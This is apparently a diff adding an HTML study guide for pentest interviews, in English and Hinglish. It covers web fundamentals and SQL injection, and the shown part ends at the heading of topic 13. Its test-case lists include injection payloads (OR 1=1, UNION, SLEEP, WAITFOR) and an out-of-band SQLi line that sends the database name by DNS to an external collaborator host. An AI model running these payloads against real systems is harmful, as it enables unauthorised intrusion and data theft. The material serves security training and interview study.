@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pentest Interview Master Guide — Part 1 (Web, API & Mobile)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,Arial,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}
+header{background:#161b22;border-bottom:1px solid #30363d;padding:16px 24px;position:sticky;top:0;z-index:10;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+h1{color:#58a6ff;font-size:1.25rem;flex:1;min-width:220px}
+#q{background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:8px 12px;border-radius:8px;width:280px;font-size:.9rem}
+#q:focus{outline:1px solid #58a6ff}
+#count{color:#8b949e;font-size:.8rem;white-space:nowrap}
+.btn{background:#238636;color:#fff;border:none;padding:8px 14px;border-radius:8px;cursor:pointer;font-size:.85rem;font-weight:600}
+.btn:hover{background:#2ea043}
+.wrap{display:flex;align-items:flex-start}
+nav{width:300px;position:sticky;top:74px;max-height:calc(100vh - 90px);overflow:auto;padding:16px;border-right:1px solid #30363d;flex-shrink:0}
+nav .cat{color:#f0883e;font-weight:700;font-size:.72rem;text-transform:uppercase;letter-spacing:1px;margin:14px 0 4px}
+nav a{display:block;color:#8b949e;text-decoration:none;padding:3px 8px;border-radius:6px;font-size:.82rem;border-left:2px solid transparent}
+nav a:hover{background:#21262d;color:#58a6ff;border-left-color:#58a6ff}
+main{flex:1;padding:24px;max-width:960px;min-width:0}
+.intro{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px 20px;margin-bottom:20px;font-size:.92rem}
+.intro b{color:#58a6ff}
+.category{color:#f0883e;font-weight:800;margin:28px 0 10px;text-transform:uppercase;font-size:.85rem;letter-spacing:1.5px;border-bottom:1px solid #30363d;padding-bottom:6px}
+.topic{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px 20px;margin-bottom:16px}
+.topic h2{color:#e6edf3;font-size:1.08rem;margin-bottom:10px;border-bottom:1px solid #30363d;padding-bottom:8px}
+.topic h2 .n{color:#f0883e;margin-right:8px;font-weight:800}
+.def{border-left:3px solid #58a6ff;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.impact{border-left:3px solid #f85149;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.mit{border-left:3px solid #3fb950;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.tc{border-left:3px solid #d29922;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.sc{border-left:3px solid #bc8cff;padding-left:12px;font-size:.93rem}
+.lbl{display:inline-block;font-size:.68rem;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:#0d1117;padding:1px 8px;border-radius:10px;margin-bottom:3px}
+.lbl.ld{background:#58a6ff}.lbl.li{background:#f85149}.lbl.lm{background:#3fb950}.lbl.lt{background:#d29922}.lbl.ls{background:#bc8cff}
+ul{margin:4px 0 4px 20px}
+li{margin:3px 0}
+code{background:#0d1117;border:1px solid #30363d;padding:1px 6px;border-radius:5px;color:#79c0ff;font-size:.85em;word-break:break-all}
+footer{color:#8b949e;font-size:.8rem;text-align:center;padding:20px}
+@media(max-width:860px){.wrap{flex-direction:column}nav{position:static;width:auto;max-height:none;border-right:none;border-bottom:1px solid #30363d}}
+</style>
+</head>
+<body>
+<header>
+  <h1>Pentest Interview Master Guide — Part 1</h1>
+  <input id="q" type="text" placeholder="Search topics (e.g. sql, jwt, pinning, hinglish)...">
+  <span id="count">50 topics</span>
+  <button class="btn" onclick="window.print()">Print / PDF</button>
+</header>
+<div class="wrap">
+<nav>
+  <div class="cat">Web Fundamentals</div>
+  <a href="#t01">1. OWASP Top 10</a>
+  <a href="#t02">2. CIA Triad</a>
+  <a href="#t03">3. AAA</a>
+  <a href="#t04">4. SOP &amp; CORS</a>
+  <a href="#t05">5. Cookie Attributes</a>
+  <a href="#t06">6. Security Headers &amp; HSTS</a>
+  <a href="#t07">7. Encoding vs Encryption vs Hashing</a>
+  <a href="#t08">8. Symmetric vs Asymmetric &amp; Ciphers</a>
+  <a href="#t09">9. Session Management</a>
+  <a href="#t10">10. AuthN vs AuthZ Order</a>
+  <a href="#t11">11. Monolith vs Microservices + API Gateway</a>
+  <div class="cat">Injection &amp; Web Attacks</div>
+  <a href="#t12">12. SQL Injection (all types)</a>
+  <a href="#t13">13. SQLi Mitigation</a>
+  <a href="#t14">14. SQL RCE</a>
+  <a href="#t15">15. "OR 1=1 fails" — Next Steps</a>
+  <a href="#t16">16. XSS (types, DOM, exploitation)</a>
+  <a href="#t17">17. XSS to Account Takeover</a>
+  <a href="#t18">18. XXE &amp; OOB XXE</a>
+  <a href="#t19">19. SSTI</a>
+  <a href="#t20">20. LFI vs RFI vs Traversal vs Listing</a>
+  <a href="#t21">21. CRLF Injection</a>
+  <a href="#t22">22. Open Redirect</a>
+  <a href="#t23">23. Host Header Injection</a>
+  <a href="#t24">24. HTML Injection</a>
+  <a href="#t25">25. Mass Assignment</a>
+  <a href="#t26">26. Insecure Deserialization</a>
+  <a href="#t27">27. File Upload to RCE</a>
+  <a href="#t28">28. Request Smuggling &amp; HPP</a>
+  <a href="#t29">29. Prototype Pollution &amp; Cache Poisoning</a>
+  <a href="#t30">30. Clickjacking</a>
+  <a href="#t31">31. CSRF (deep)</a>
+  <div class="cat">AuthN / AuthZ / Session</div>
+  <a href="#t32">32. OTP / 2FA / MFA Bypass</a>
+  <a href="#t33">33. JWT Attacks</a>
+  <a href="#t34">34. OAuth vs OIDC</a>
+  <a href="#t35">35. IDOR / BOLA / BFLA / Priv Esc</a>
+  <a href="#t36">36. Session Hijack vs Fixation</a>
+  <a href="#t37">37. Login Testing + Rate Limiting</a>
+  <div class="cat">API &amp; Server</div>
+  <a href="#t38">38. API Testing Approach + Tokens</a>
+  <a href="#t39">39. SSRF (deep)</a>
+  <a href="#t40">40. WAF Detection &amp; Bypass</a>
+  <a href="#t41">41. Business Logic Flaws</a>
+  <div class="cat">Mobile Security</div>
+  <a href="#t42">42. Static Android Testing</a>
+  <a href="#t43">43. SSL Pinning (deep)</a>
+  <a href="#t44">44. Root Bypass &amp; Rooted Devices</a>
+  <a href="#t45">45. Exported Components &amp; Intent Filters</a>
+  <a href="#t46">46. WebView Security</a>
+  <a href="#t47">47. Content Providers</a>
+  <a href="#t48">48. Android Storage / Backup / Logs</a>
+  <a href="#t49">49. Tapjacking</a>
+  <a href="#t50">50. Drozer (LFI &amp; SQLi)</a>
+</nav>
+
+<main>
+<div class="intro"><b>How to use:</b> Har ek topic mein <b>Definition (English)</b>, <b>Impact</b>, <b>Mitigation (5 points)</b>, <b>Test Cases (Hinglish)</b> aur <b>Real-world Scenario</b> diya hai. Search box se filter karo, Print button se PDF banao. Interview se pehle 2-3 baar revise karo.</div>
+
+<!-- ==================== WEB FUNDAMENTALS ==================== -->
+<h3 class="category" id="cat1">Web Fundamentals</h3>
+
+<section class="topic" id="t01">
+<h2><span class="n">01</span>OWASP Top 10 (2021)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>OWASP Top 10 is the industry-standard list of the 10 most critical web application security risks, updated every ~3-4 years. 2021 edition: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable &amp; Outdated Components, A07 Identification &amp; Authentication Failures, A08 Software &amp; Data Integrity Failures, A09 Security Logging &amp; Monitoring Failures, A10 SSRF.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>These 10 classes cause the majority of real-world breaches — data theft, account takeover, RCE, ransomware. A01 (Access Control) alone covers IDOR, missing authz, privilege escalation.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Access control: deny-by-default, object/function-level checks server-side.</li>
+<li>Cryptography: strong algorithms (AES-256-GCM, Argon2/bcrypt), proper key management.</li>
+<li>Injection: parameterized queries, output encoding, allowlist validation.</li>
+<li>Patch management: track and update third-party components (SCA tools).</li>
+<li>Logging/monitoring: log auth events, alert on anomalies, SIEM integration.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Har API endpoint par role change karke (normal user → admin) request bhejo aur dekho kya access milta hai.</li>
+<li>Login form par <code>' OR 1=1--</code> daalo — injection check.</li>
+<li>Password field mein weak hash (MD5) detect karo — crypto failure check.</li>
+<li>Response headers dekho — HSTS, CSP missing? (security misconfig).</li>
+<li>Version disclosure (Server header, error pages) se outdated components pata karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>E-commerce app: user apne order ID ko 1001 → 1002 change karke doosre customer ka data dekh leta hai — classic A01 Broken Access Control / IDOR.</div>
+</section>
+
+<section class="topic" id="t02">
+<h2><span class="n">02</span>CIA Triad</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>CIA is the core security model: <b>Confidentiality</b> — data sirf authorized logon ko accessible ho; <b>Integrity</b> — data accurate aur unmodified rahe; <b>Availability</b> — systems aur data jab zaroorat ho tab available rahein. Security controls ko in teeno ke against measure karte hain.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Confidentiality breach = data leak; Integrity breach = tampered transactions/false data; Availability breach = DoS, business downtime. Ek attack multiple pillars ko hit kar sakta hai (e.g., SQLi = confidentiality + integrity).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Confidentiality: encryption at rest &amp; in transit, access control, least privilege.</li>
+<li>Integrity: hashing, digital signatures, audit logs, input validation.</li>
+<li>Availability: redundancy, load balancing, DDoS protection, backups.</li>
+<li>Defense in depth: WAF + patching + monitoring together.</li>
+<li>Regular DR/BCP testing to ensure availability guarantees hold.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Kisi sensitive endpoint par bina token request karo — confidentiality check.</li>
+<li>Bank balance update karke response compare karo (double-spend) — integrity check.</li>
+<li>Server par SYN flood / slowloris chalakar availability test karo (authorized scope mein).</li>
+<li>Network traffic sniff karo (Wireshark) — data plaintext hai? (confidentiality).</li>
+<li>File hash change karke app detect karta hai ya nahi — integrity check.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Ransomware attack: files encrypt ho jati hain (confidentiality broken), backup delete (availability broken), aur attacker data leak karne ki dhamki deta hai — teeno pillars ek saath fail.</div>
+</section>
+
+<section class="topic" id="t03">
+<h2><span class="n">03</span>AAA — Authentication, Authorization, Accounting</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Authentication</b> = "Aap kaun ho?" (verify identity — password, OTP, biometric). <b>Authorization</b> = "Aap kya kar sakte ho?" (permissions/roles). <b>Accounting</b> = "Aapne kya kiya?" (logging, auditing, billing, session tracking). SaaS, VPN (RADIUS/TACACS+), aur enterprise apps mein yeh teen layers mandatory hain.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>AuthN failure → impersonation; AuthZ failure → IDOR/privilege escalation; Accounting failure → attacks undetected, compliance (PCI-DSS, SOX) failure, no forensic trail.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>AuthN: MFA, secure password storage (Argon2/bcrypt), session rotation.</li>
+<li>AuthZ: role-based access control, server-side checks on every request.</li>
+<li>Accounting: centralized logging (who/what/when/where), log integrity (WORM/immutable).</li>
+<li>Least privilege for both users and service accounts.</li>
+<li>Periodic access reviews and audit report generation.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Bina login sensitive page kholo — authentication check.</li>
+<li>User A ke session se User B ka resource access karo — authorization check.</li>
+<li>Audit log mein login, logout, failed attempts recorded hain? — accounting check.</li>
+<li>Admin API call normal user se karo — vertical authz check.</li>
+<li>Delete request ka log check karo — accountability traceable hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking app: customer login karta hai (AuthN), sirf apne accounts dekh sakta hai (AuthZ), aur har transaction audit log mein jaati hai (Accounting) — regulatory requirement.</div>
+</section>
+
+<section class="topic" id="t04">
+<h2><span class="n">04</span>SOP (Same-Origin Policy) &amp; CORS (Cross-Origin Resource Sharing)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>SOP</b>: Browser ka core rule — page sirf apne origin (scheme + host + port) ke resources padh sakta hai; doosre origin ka response <i>read</i> nahi kar sakta (embed kar sakta hai: img, script). <b>CORS</b>: Server voluntarily SOP relax karta hai via <code>Access-Control-Allow-Origin</code> header taaki trusted cross-origin requests allowed ho. SOP attack ko rokti hai; CORS misconfig usko wapas khol deti hai.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Misconfigured CORS (reflecting any origin, <code>AC-Allow-Credentials:true</code> + wildcard) = attacker's site victim ke logged-in context mein API data (tokens, PII) read kar sakti hai — cross-origin data theft.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Never reflect arbitrary origins — maintain a strict allowlist of trusted domains.</li>
+<li>Never use <code>Access-Control-Allow-Origin: *</code> together with credentials.</li>
+<li>Send <code>Vary: Origin</code> header so caches don't serve wrong ACAO.</li>
+<li>Keep CORS disabled for sensitive endpoints unless genuinely needed.</li>
+<li>Validate Origin header server-side; reject null origins.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Request mein <code>Origin: https://evil.com</code> bhejo — kya response mein <code>ACAO: https://evil.com</code> reflect hota hai?</li>
+<li><code>Origin: null</code> try karo (iframe sandbox se) — accept hota hai?</li>
+<li>Credentials header ke saath wildcard ACAO hai? — critical finding.</li>
+<li>Preflight (OPTIONS) se allowed methods/max-age check karo.</li>
+<li>Attacker page banao jo victim ke API ko fetch kare — data read hota hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Bank API <code>ACAO: *</code> ke saath <code>Access-Control-Allow-Credentials: true</code> deta hai → attacker ki phishing site victim ke logged-in session se balance + transactions read kar leti hai.</div>
+</section>
+
+<section class="topic" id="t05">
+<h2><span class="n">05</span>Cookie Attributes (Secure, HttpOnly, SameSite)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Cookies = client-side session/state storage. Attributes: <b>Secure</b> — sirf HTTPS par bheji jaaye; <b>HttpOnly</b> — JavaScript (`document.cookie`) se access nahi ho sakti (XSS se bachat); <b>SameSite</b> — cross-site requests par cookie nahi bheji jaati (<code>Strict</code>/<code>Lax</code>/<code>None</code>); plus <b>Domain</b>, <b>Path</b>, <b>Expires/Max-Age</b>, <b>__Host-/__Secure- prefix</b>, <b>Partitioned</b> (CHIPS).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Bina HttpOnly → XSS se session steal; bina Secure → MITM sniffing; SameSite=None bina zaroorat → CSRF attack surface; broad Domain/Path → cookie doosre subdomains par leak.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Always set <code>Secure; HttpOnly; SameSite=Lax</code> (or Strict) on session cookies.</li>
+<li>Use <code>__Host-</code> prefix for session cookies (forces Secure + no Domain + root Path).</li>
+<li>Use SameSite=None ONLY for cross-site needs (OAuth/embedded) and pair with CSRF tokens.</li>
+<li>Restrict Domain/Path scope to the minimum required.</li>
+<li>Set short Max-Age and rotate session ID on login/logout.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Set-Cookie headers inspect karo — HttpOnly missing? Secure missing? SameSite missing?</li>
+<li>Browser console mein <code>document.cookie</code> type karo — session token dikh raha hai? (HttpOnly fail)</li>
+<li>HTTP (non-TLS) par site kholo — cookie send hoti hai? (Secure fail)</li>
+<li>Cross-site iframe/form se request bhejo — cookie attach hoti hai? (SameSite test)</li>
+<li>Subdomain par cookie accessible hai? — Domain attribute check.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Stored XSS mila but cookie HttpOnly hai — attacker cookie nahi le sakta, isliye CSRF token + session token dono HttpOnly + SameSite ke saath rakhe jaate hain.</div>
+</section>
+
+<section class="topic" id="t06">
+<h2><span class="n">06</span>Security Headers &amp; HSTS</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>HTTP response headers jo browser behavior control karte hain: <b>HSTS</b> (<code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code>) — browser hamesha HTTPS force kare; <b>CSP</b> — kaunsi scripts/sources load hon; <b>X-Frame-Options</b> — clickjacking rokta hai; <b>X-Content-Type-Options: nosniff</b> — MIME sniffing rokta hai; <b>Referrer-Policy</b>; <b>Permissions-Policy</b>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Missing HSTS → SSL strip/MITM; missing CSP → XSS fully exploitable; missing XFO → clickjacking; missing nosniff → MIME confusion XSS on file uploads.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>HSTS with <code>includeSubDomains; preload</code> on all HTTPS hosts.</li>
+<li>CSP: <code>default-src 'self'; object-src 'none'; frame-ancestors 'none'</code> etc.</li>
+<li>X-Frame-Options: DENY/SAMEORIGIN (or CSP frame-ancestors).</li>
+<li>X-Content-Type-Options: nosniff on all responses.</li>
+<li>Referrer-Policy: no-referrer / strict-origin-when-cross-origin.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Har response ka header set check karo — HSTS, CSP, XFO, nosniff present hain?</li>
+<li>HTTP par site open karo — HTTPS par auto-redirect hota hai? (HSTS test)</li>
+<li>CSP policy mein <code>'unsafe-inline'</code> ya <code>*.cdn.com</code> loose hai?</li>
+<li>Page ko iframe mein load karo — load hota hai? (clickjacking check)</li>
+<li>File upload response ko HTML ke roop mein render karo — MIME sniffing hota hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>HSTS preload list mein domain submit karne ke baad bhi subdomain HTTP par serve ho raha hai → attacker SSL-strip karke credentials capture karta hai.</div>
+</section>
+
+<section class="topic" id="t07">
+<h2><span class="n">07</span>Encoding vs Encryption vs Hashing</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Encoding</b> (Base64, URL, HTML): data ko ek format se doosre mein convert karna — <b>reversible without any key</b>, secrecy ka koi intent nahi. <b>Encryption</b> (AES, RSA): data ko key ke saath scramble karna — <b>reversible WITH key</b>, secrecy ke liye. <b>Hashing</b> (SHA-256, bcrypt): data ko fixed-size digest mein convert karna — <b>one-way, irreversible by design</b>, integrity aur password storage ke liye.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Base64 se "encrypt" karna (devs ki common galti) → data instantly readable; unsalted/weak hashes → rainbow table se crack; plaintext password storage → full account compromise on DB leak.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Use encoding ONLY for data transfer/representation, never for security.</li>
+<li>Use encryption for confidentiality (data at rest/in transit) with strong key management.</li>
+<li>Use salted slow hashes (bcrypt/Argon2/scrypt) for passwords — never MD5/SHA1/plain SHA-256 for secrets.</li>
+<li>Use hashing (SHA-256/384) for integrity verification of files/software.</li>
+<li>HMAC with secret key for message authenticity.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Application mein Base64-encoded password mila? Decode karke verify karo — plaintext expose hota hai?</li>
+<li>DB dump mein password hash hai? <code>hashcat -m 0</code> se crack karke dekho (MD5 weak?).</li>
+<li>API token URL-encoded hai? — encoding vs security confusion check.</li>
+<li>Two same passwords ka hash same hai? — salt missing ka proof.</li>
+<li>Encrypted file ko bina key decrypt karne ki koshish karo — strong algorithm use ho raha hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Dev ne passwords Base64 karke DB mein store kiye — breach mein 5 lakh hashes instantly decoded, sab accounts compromised. Fix: bcrypt + salt.</div>
+</section>
+
+<section class="topic" id="t08">
+<h2><span class="n">08</span>Symmetric vs Asymmetric Encryption + Strong/Weak Ciphers</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Symmetric</b> (AES-256, ChaCha20): encrypt aur decrypt ke liye <b>same key</b> — fast, bulk data ke liye. <b>Asymmetric</b> (RSA-2048+, ECDSA, ECDH): <b>key pair</b> (public + private) — slow, key exchange/digital signatures ke liye. TLS dono use karta hai: asymmetric se symmetric key exchange, phir AES se data. <b>Weak ciphers:</b> DES, 3DES, RC4, ECB mode, MD5, SHA-1 (deprecated); <b>Strong:</b> AES-256-GCM, ChaCha20-Poly1305, RSA-2048+, ECC (P-256+), SHA-256/384, Argon2/bcrypt.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Weak cipher (RC4/DES) → practical cryptanalysis; MD5 → collision attacks (forged certs, tampered files); ECB → pattern leak (logo/photo recognizable); hardcoded keys → full decryption.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Use AES-256-GCM / ChaCha20-Poly1305 for symmetric encryption (authenticated modes).</li>
+<li>Use RSA-2048+ or ECC P-256+ for asymmetric operations.</li>
+<li>Disable legacy protocols/ciphers (SSLv3, TLS 1.0/1.1, RC4, 3DES) server-side.</li>
+<li>Use HMAC + key derivation (PBKDF2/Argon2) properly; unique IV/nonce per encryption.</li>
+<li>Key management: HSM/KMS, key rotation, never hardcode keys in source.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>SSL/TLS scan karo (testssl.sh / Qualys SSL Labs) — weak cipher supported hai?</li>
+<li>ECB mode use ho raha hai? Same plaintext blocks → same ciphertext blocks detect karo.</li>
+<li>APK/jar mein hardcoded AES key search karo (<code>strings</code> / jadx).</li>
+<li>MD5/SHA-1 hash use ho raha hai? — weak hash check.</li>
+<li>Same IV reuse detect karo — two ciphertexts XOR karke pattern dekho.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Legacy banking app sirf TLS 1.0 + RC4 support karta hai → attacker passive sniffing se session decrypt kar leta hai (BEAST/POODLE class attacks).</div>
+</section>
+
+<section class="topic" id="t09">
+<h2><span class="n">09</span>Session Management &amp; Why Cookies/Cache Are Used</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>HTTP stateless hai — har request alag. Session management server par state (session store/Redis/DB) rakhta hai aur client ko ek random session ID cookie mein deta hai. Cookies isliye use hote hain kyunki browser unhe har request par automatically bhejta hai. Cache (browser/CDN/Redis) repeated data store karta hai taaki speed badhe aur bandwidth bache.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Predictable/weak session ID → session hijack; no expiry → stale sessions; fixation → attacker-controlled session; cache-sensitive data (tokens in cache) → data leak to shared machines.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Generate session IDs with CSPRNG, high entropy (128+ bits).</li>
+<li>Set Secure, HttpOnly, SameSite cookies with reasonable Max-Age.</li>
+<li>Rotate session ID on login, privilege change; invalidate on logout/password change.</li>
+<li>Server-side expiry + idle timeout + absolute timeout.</li>
+<li>Never cache sensitive responses: <code>Cache-Control: no-store</code> on private data.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Login se pehle aur baad ka session ID compare karo — rotation hoti hai?</li>
+<li>Session ID character set check karo — predictable pattern (timestamp/username)?</li>
+<li>Logout ke baad session token reuse karo — ab bhi valid hai?</li>
+<li>Session ko 30 min idle chhodo — expire hota hai?</li>
+<li>Response headers <code>Cache-Control: no-store</code> missing hain sensitive pages par?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Shared cybercafe PC: user logout karta hai but session server par 24hr valid rehta hai → agla user purana session cookie inject karke account access kar leta hai.</div>
+</section>
+
+<section class="topic" id="t10">
+<h2><span class="n">10</span>Authentication vs Authorization — Implementation Order</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Order matter karta hai: <b>pehle Authentication</b> (verify who you are), <b>phir Authorization</b> (check what you can do). Interview example: controller mein pehle View create/load ho jata hai, baad mein role check hota hai — isme sensitive data render hone se pehle check hona chahiye. Correct pattern: authN → authZ check → business logic → view render.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>View-before-check → unauthorized users ko data/UI dikh jata hai; authZ check bhoolna → IDOR; authN ke baad authZ missing → any logged-in user admin functions access karta hai (BFLA).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Apply authentication middleware/attribute before controllers execute.</li>
+<li>Apply authorization checks (role/permission) before ANY data access or view creation.</li>
+<li>Use framework-level guards (e.g., <code>@PreAuthorize</code>, <code>AuthorizeAttribute</code>) — not manual scattered checks.</li>
+<li>Deny-by-default: if no role matches, reject.</li>
+<li>Test negative paths: unauthenticated + authenticated-unauthorized + authorized.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Bina login page source/network tab se data aata hai? (pehle view ban raha hai?)</li>
+<li>Normal user ko admin dashboard URL directly daal kar dekho — access milta hai?</li>
+<li>Response time compare karo: unauthorized request par data processing ho rahi hai? (timing side-channel)</li>
+<li>Role parameter (role=admin) POST karke dekho — server use karta hai?</li>
+<li>Horizontal test: user A ke dashboard mein user B ka resource reference daalo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>ASP.NET app: <code>var order = db.Orders.Find(id); View(order);</code> — phir check karta hai "if(user.Id != order.UserId) deny". Fix: check pehle karo, warna data load hi mat karo.</div>
+</section>
+
+<section class="topic" id="t11">
+<h2><span class="n">11</span>Monolith vs Microservices + API Gateway</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Monolith:</b> ek hi deployable unit mein sab (UI, business logic, DB). <b>Microservices:</b> chhote independent services, apni DB ke saath, APIs se communicate. <b>API Gateway:</b> microservices ke saamne single entry point — routing, authentication, rate limiting, request validation, logging, aggregation karta hai.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Monolith: single point of failure, blast radius bada. Microservices: attack surface bada (har service vulnerable ho sakti hai), service-to-service trust issues, secret sprawl. Gateway misconfig → auth bypass across ALL services.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Centralize authN/authZ at gateway + re-validate at service level (defense in depth).</li>
+<li>Service-to-service: mTLS, short-lived tokens, never trust internal network blindly.</li>
+<li>Secrets via vault (HashiCorp Vault/KMS), not env files committed to git.</li>
+<li>Gateway: strict input validation, rate limiting per client, request size limits.</li>
+<li>Network segmentation: internal services not publicly routable.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Gateway ke bypass attempts: direct IP/hostname se service access karo (dns rebinding, Host header).</li>
+<li>Gateway par rate limit lagao — bypass ho sakta hai (X-Forwarded-For spoof)?</li>
+<li>Path traversal se doosri service ka route hit karo: <code>/api/../admin</code>.</li>
+<li>HTTP method confusion: GET/POST/PATCH se auth check bypass hota hai?</li>
+<li>Har microservice ka apna auth hai? Ek service compromise → doosri accessible?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Fintech: payments service bina auth ke internal network par tha → attacker kisi vulnerable service se pivot karke payments API directly call kar leta hai (gateway bypass).</div>
+</section>
+
+<!-- ==================== INJECTION & WEB ATTACKS ==================== -->
+<h3 class="category">Injection &amp; Web Attacks</h3>
+
+<section class="topic" id="t12">
+<h2><span class="n">12</span>SQL Injection — Types, Manual Techniques, OOB, Second-Order</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>SQLi tab hota hai jab user input directly SQL query mein concatenate hota hai. Types: <b>In-band</b> (error-based + UNION-based — result same response mein), <b>Blind</b> (boolean-based + time-based — no data in response), <b>Out-of-band (OOB)</b> (data DNS/HTTP request ke through attacker server par jata hai), <b>Second-order</b> (malicious input store hota hai, baad mein kisi aur query mein use hota hai). Manual flow: quote test → column count → UNION → DB fingerprint → data dump.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Data theft (PII/credentials), authentication bypass, data tampering, RCE (xp_cmdshell/INTO OUTFILE), complete DB compromise — OWASP #3, CVSS up to 9.8+.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Parameterized queries / prepared statements for ALL queries.</li>
+<li>Stored procedures / ORM with safe APIs; escape user input only as last resort.</li>
+<li>Least-privilege DB accounts (no DROP/GRANT for app user).</li>
+<li>Input validation (allowlist) + output encoding for second-order cases.</li>
+<li>WAF + query-level monitoring as defense in depth, not replacement.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Har input par <code>'</code> daalo — error aata hai? (error-based)</li>
+<li><code>' OR 1=1--</code> aur <code>' OR 1=2--</code> ke responses compare karo (boolean blind).</li>
+<li><code>ORDER BY 1..10</code> se column count nikaalo, phir <code>UNION SELECT 1,2,3...</code>.</li>
+<li>Time-based: <code>'; IF(1=1) WAITFOR DELAY '0:0:5'--</code> (MSSQL) / <code>' AND SLEEP(5)--</code> (MySQL).</li>
+<li>OOB: Burp Collaborator DNS se <code>LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.collab.oastify.com\\a'))</code> test karo.</li>
+<li>Second-order: username mein <code>' OR 1=1--</code> register karo, phir profile/search feature use karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Ticket booking site ke search par time-based blind SQLi mila → 2 saal ke 4 crore user records (names, emails, password hashes) dump hue. Fix: prepared statements + DB least privilege.</div>
+</section>
+
+<section class="topic" id="t13">
+<h2><span class="n">13</span>SQLi Mitigation — Client, Server, DB Levels + Dynamic vs Parameterized Queries</h2>
